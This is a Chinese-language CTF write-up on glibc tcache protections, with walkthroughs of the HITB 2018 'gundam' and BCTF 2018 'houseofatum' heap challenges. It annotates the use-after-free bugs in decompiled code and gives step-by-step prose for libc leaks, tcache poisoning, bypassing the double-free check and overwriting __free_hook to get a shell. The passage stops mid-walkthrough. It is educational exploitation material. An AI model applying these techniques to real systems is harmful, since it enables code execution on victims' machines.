                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J423U7BS3AVPUMN.jpg"
                      alt="img"
                ></p>
<p>使用glibc-2.27的输出，nil说明漏洞已修复。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GYTCUQJPMZ3ZT9S.jpg"
                      alt="img"
                ></p>
<h2 id="double-free-check"><a href="#double-free-check" class="headerlink" title="double free check"></a>double free check</h2><p>glibc-2.29新增加double free检查，方法是在tcache_entry结构体中新增加标志位key来检查chunk是否在tcache bin中。当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 double Free 报错。因为chunk的key保存在bk位置，只需将其修改即可绕过double free检查。</p>
<h1 id="经典赛题（已提供相关附件）"><a href="#经典赛题（已提供相关附件）" class="headerlink" title="经典赛题（已提供相关附件）"></a>经典赛题（已提供相关附件）</h1><p>说明：附件中的赛题已经用patchelf改好环境。</p>
<h2 id="HITB-CTF-2018-gundam"><a href="#HITB-CTF-2018-gundam" class="headerlink" title="HITB CTF 2018: gundam"></a>HITB CTF 2018: gundam</h2><p><strong>1.修改rpath。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5UPXC4BVAGDJUG8.jpg"
                      alt="img"
                ></p>
<p><strong>2.检查保护。</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7UJ686BG6C4DDVJ.jpg"
                      alt="img"
                ></p>
<p><strong>3.试运行。</strong></p>
<p>可见为菜单题。</p>
<p>1-创建一个gundam机器人</p>
<p>2-访问gundamu</p>
<p>3-销毁一个gundam</p>
<p>4-炸毁工厂</p>
<p>5-退出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YJXK6788EQ5JJG9.jpg"
                      alt="img"
                ></p>
<p><strong>4.逆向分析。</strong></p>
<p>1-分析Build函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Build()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  void *s; // [rsp+8h] [rbp-18h]</span><br><span class="line">  void *buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  s = 0LL;</span><br><span class="line">  buf = 0LL;</span><br><span class="line">  if ( (unsigned int)dword_20208C &lt;= 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    s = malloc(0x28uLL);</span><br><span class="line">    memset(s, 0, 0x28uLL);</span><br><span class="line">    buf = malloc(0x100uLL);</span><br><span class="line">    if ( !buf )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;error !&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;The name of gundam :&quot;);</span><br><span class="line">    //buf记录名字，没有&#x27;\x00&#x27;限制可能泄露</span><br><span class="line">    read(0, buf, 0x100uLL);</span><br><span class="line">    // (s+8)位置 -&gt; buf</span><br><span class="line">    *((_QWORD *)s + 1) = buf;</span><br><span class="line">    printf(&quot;The type of the gundam :&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    //type &lt; 3</span><br><span class="line">    if ( v1 &gt;= 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid.&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    // (s+16) -&gt; type</span><br><span class="line">    strcpy((char *)s + 16, &amp;aFreedom[20 * v1]);</span><br><span class="line">    // s-&gt;1 标记为在使用。</span><br><span class="line">    *(_DWORD *)s = 1;</span><br><span class="line">    for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !qword_2020A0[i] )</span><br><span class="line">      &#123;</span><br><span class="line">          //Factory[9]，工厂数组。</span><br><span class="line">        qword_2020A0[i] = s;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 换原为NumOfGundam，记录gundam的数量</span><br><span class="line">    ++dword_20208C;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不难分析出gundam结构体</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct gundam&#123;</span><br><span class="line">    int flag;</span><br><span class="line">    char *buf;</span><br><span class="line">    char type[60];</span><br><span class="line">&#125;gundam;</span><br><span class="line">struct gundam *factory[9]</span><br></pre></td></tr></table></figure></div>

<p>2-Visit函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Visit()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( NumOfGundam )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        //将每个gundma的buf和Type打印出来。</span><br><span class="line">      if ( factory[i] &amp;&amp; *(_DWORD *)factory[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;\nGundam[%u] :%s&quot;, i, *(const char **)(factory[i] + 8LL));</span><br><span class="line">        printf(&quot;Type[%u] :%s\n&quot;, i, (const char *)(factory[i] + 16LL));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam produced!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3-Destroy函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 Destroy()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  if ( NumOfGundam )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Which gundam do you want to Destory:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    if ( v1 &gt; 8 || !factory[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    // 使用标记置为0</span><br><span class="line">    *(_DWORD *)factory[v1] = 0;</span><br><span class="line">    // name存在UAF漏洞。</span><br><span class="line">    free(*(void **)(factory[v1] + 8LL));</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  // 并没有将NumOfGundam数量-1</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>4-BlowUp函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 BlowUp()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( factory[i] &amp;&amp; !*(_DWORD *)factory[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      free((void *)factory[i]);</span><br><span class="line">      factory[i] = 0LL;</span><br><span class="line">      // 只把标记为置为0，存在uaf。</span><br><span class="line">      --NumOfGundam;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.漏洞利用</strong></p>
<p>（1）利用unsorted bin attack泄露main_arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted bin，剩下一个阻隔top chunk防止合并。可以看到unsorted bin中的chunk的fd和bk指向了一个栈地址(main_arena+88)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZEASEE9NZU44C5S.jpg"
                      alt="img"
                ></p>
<p>blow up后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_79F5P5RSTUVS4CX.jpg"
                      alt="img"
                ></p>
<p>计算这个栈地址与libc基地址的偏移。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_H876K6X845YEQTM.jpg"
                      alt="img"
                ></p>
<p>偏移为：0x3dac78</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BMEDZ8WHXWHZ6GA.jpg"
                      alt="img"
                ></p>
<p>在申请8个chunk，将unsorted bin中的chunk申请出来，再利用visit()函数泄露main_arena+88处的栈地址。</p>
<p>此时需要注意，chunk优先从tcache取出，然后Type[7]才是unsorted bin中的chunk。由于第8个chunk的fd指向main_arena+88处的地址，</p>
<p>所以此时只需要接收6个字节（因为64位栈地址前2字节为’\x00’,并且用%s打印地址）然后用’\x00’补齐即可。</p>
<p>再用main_arena+88处的地址减去上面计算出的固定偏移即可得到栈的基地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_82AMDYGDZBJYGEX.jpg"
                      alt="img"
                ></p>
<p>进而可以由libc-2.26.so得到system和__free_hook地址。</p>
<p>（2）利用double free制造tcache poisoning到&amp;__free_hook</p>
<p>依次释放2，1，0，0。此时tcache bin状态如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_R5CPWZN2CM9D8X6.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5NNQRGXBK3K8GET.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4FZWRZH9EK2D29U.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XQ7DM265PKATFMY.jpg"
                      alt="img"
                ></p>
<p>blow up 后</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AKAUSN3ZH6Q75K6.jpg"
                      alt="img"
                ></p>
<p>已经形成了double free。此时在申请一个堆块将会把chunk0申请出来，将其内容改为__free_hook的地址。</p>
<p>因为此时chunk0依然在tcache bin(0x110)的链上，所以__free_hook会被挂在tcache bins的链上。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VRCZDXZ7HZPPG3A.jpg"
                      alt="img"
                ></p>
<p>（3）将物理堆块为chunk0，逻辑为chunk1的factory[1]_buf改写为’&#x2F;bin&#x2F;sh\x00’，修改__free_hook为system地址。</p>
<p>修改factory[1]_buf为’&#x2F;bin&#x2F;sh\x00’</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GBGYY98JXSD8Z27.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DYS48TUVAJY4QZ2.jpg"
                      alt="img"
                ></p>
<p>此时tcache bin中还剩下__free_hook地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YDCJ64QZPUGV3WK.jpg"
                      alt="img"
                ></p>
<p>再次申请得到__free__hook+0x10处的堆块，此时修改__free_hook为system。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VRQR9A9XJBAS7JG.jpg"
                      alt="img"
                ></p>
<p>（4）free(‘&#x2F;bin&#x2F;sh\x00’);</p>
<p>最后 destory(1)，也就是free(‘&#x2F;bin&#x2F;sh\x00’)即可getshell</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SMCEP4CKXCCRSW4.jpg"
                      alt="img"
                ></p>
<h2 id="BCTF2018-houseofatum"><a href="#BCTF2018-houseofatum" class="headerlink" title="BCTF2018-houseofatum"></a>BCTF2018-houseofatum</h2><p><strong>1.修改rpath</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PFF4YXVDNYUVCXK.jpg"
                      alt="img"
                ></p>
<p><strong>2.检查保护</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZEK39HH86HYX8Y.jpg"
                      alt="img"
                ></p>
<p><strong>3.试运行</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QWRKEKAF4E79ZBZ.jpg"
                      alt="img"
                ></p>
<p><strong>4.逆向分析</strong></p>
<p>1-alloc函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int alloc()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line">  // 只允许两个堆块同时存在</span><br><span class="line">  for ( i = 0; i &lt;= 1 &amp;&amp; *((_QWORD *)&amp;notes + i); ++i );</span><br><span class="line">  if ( i == 2 )</span><br><span class="line">    return puts(&quot;Too many notes!&quot;);</span><br><span class="line">  printf(&quot;Input the content:&quot;);</span><br><span class="line">  //  利用notes[i]管理note，实际大小为0x50。</span><br><span class="line">  *((_QWORD *)&amp;notes + i) = malloc(0x48uLL);</span><br><span class="line">  readn(*((void **)&amp;notes + i), 0x48uLL);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">ssize_t __fastcall readn(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  return read(0, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>2-edit函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &gt; 1 || !*((_QWORD *)&amp;notes + v1) )</span><br><span class="line">    return puts(&quot;No such note!&quot;);</span><br><span class="line">  printf(&quot;Input the content:&quot;);</span><br><span class="line">  // 读取0x48可能存在泄露</span><br><span class="line">  readn(*((void **)&amp;notes + v1), 0x48uLL);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3-del函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 del()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+0h] [rbp-10h]</span><br><span class="line">  char v2[2]; // [rsp+6h] [rbp-Ah] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &lt;= 1 &amp;&amp; *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)&amp;notes + v1));</span><br><span class="line">    printf(&quot;Clear?(y/n):&quot;);</span><br><span class="line">    // 输入n，可以导致UAF漏洞。</span><br><span class="line">    readn(v2, 2uLL);</span><br><span class="line">    if ( v2[0] == &#x27;y&#x27; )</span><br><span class="line">      *((_QWORD *)&amp;notes + v1) = 0LL;</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such note!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>4-show函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &gt; 1 || !*((_QWORD *)&amp;notes + v1) )</span><br><span class="line">    return puts(&quot;No such note!&quot;);</span><br><span class="line">  printf(&quot;Content:&quot;);</span><br><span class="line">  puts(*((const char **)&amp;notes + v1));</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.漏洞利用</strong></p>
<p>（1）泄露堆地址。</p>
<p>申请两个chunk分别记为chunk0，chunk1。把chunk1的第8个0x8处填写为0x11，防止与top chunk合并。</p>
<p>此时 chunk1 结构如图：</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JGNR9UDE89QPQV8.jpg"
                      alt="img"
                ></p>
<p>此时heap结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8PMV886RQEQ2XPB.jpg"
                      alt="img"
                ></p>
<p>然后将chunk0释放6次，填满tcache，并选择’n’来构成UAF漏洞。</p>
<p>此时heap和bins结构如下。chunk0的fd为自身地址，show(0)即可泄露堆地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VQRTTYAUDKZ7CBK.jpg"
                      alt="img"
                ></p>
<p>（2）泄露libc基址</p>
<p>再次释放chunk0，并将其fd清空。因为tcache已满7个，所以此时chunk0会进入fast bin。</p>
<p>tcache指向fd位置，而fast bin则指向prev_size，所以chunk0在fast bin中比tcache多0x10。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_P2K9PJJ3XY23DRF.jpg"
                      alt="img"
                ></p>
<p>现在申请一个堆块将会从tcache中获取，将其fd改为(chunk0_fd-0x20)，那么fast bin 将会把(chunk0_fd-0x20)链接进来。</p>
<p>因为将chunk0从tcache中取走，tcache为空，但实际只取走一个堆块，所以counts[0x50]计数为6。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4UUX9X9XCFV3P3S.jpg"
                      alt="img"
                ></p>
<p>再次申请一个堆块，由于tcache为空，那么会去fastbin中寻找，</p>
<p>因为成功从fastbin中返回了堆块，会触发tcache存放机制，将fastbin剩余堆块加入tcache，</p>
<p>又因为fast bin指向prev_size，tcache指向fd，所以将fastbin中堆块加入tcache时，地址会加0x10。</p>
<p>取出的堆块在notes[1]，其用户地址在chunk0_fd(正常)，而tcache中的chunk则指向了chunk0_prev_size位置。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AP5DUCCCSS6XNBH.jpg"
                      alt="img"
                ></p>
<p>此时，free掉notes[1]，将chunk0放进fast bin中，</p>
<p>然后再次申请一个堆块，此堆块由notes[1]管理，将chunk0的size修改为0x91，方便之后的unsorted bin attack。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X83SEQ6GBB7AAN8.jpg"
                      alt="img"
                ></p>
<p>此时，notes[0]的fake_chunk0大小已被修改为0x91，释放8次notes[0]即可将fake_chunk0放进unsorted bin。</p>
<p>然后其fd和bk指针将被修改为一个栈上的地址(main_arena+88)</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_9YWKZ4DXCQ5QRBT.jpg"
                      alt="img"
                ></p>
<p>计算其与libc基地址的偏移。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SH8FTTPY2M66RRC.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HXUYZWCQP9QHCS3.jpg"
                      alt="img"
                ></p>
<p>因为输出用到puts函数，而这个栈地址在fake_chunk0_fd位置，</p>
<p>所以需要利用notes[1]将fake_chunk0的的prev_size和size填满泄露libc地址时才能避免截断。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QMVR2WYC2N9A88H.jpg"
                      alt="img"
                ></p>
<p>将泄露出来的栈地址减去计算出来的偏移，即可得到libc基址。</p>
<p>（3）将__free_hook替换为one_gadget。</p>
<p>利用one_gadget工具获取one_gadget。</p>
<p>因为已经得到了libc基址，那么可以根据给的libc-2.26.so得到__free_hook和one_gadget的运行时真实地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_MN5N9AXJB8D5WK9.jpg"
                      alt="img"
                ></p>
<p>利用notes[1]可以将fake_chunk0_fd改为__free_hook-0x10的地址。</p>
<p>此时fastbin将__free_hook链接进来了。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ANN46ZTE7FJ6HPR.jpg"
                      alt="img"
                ></p>
<p>再次申请一个堆块，会由notes[0]来管理。并且会触发tcache相关机制，将fastbin中剩余chunk（__free_hook）加入tcache。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
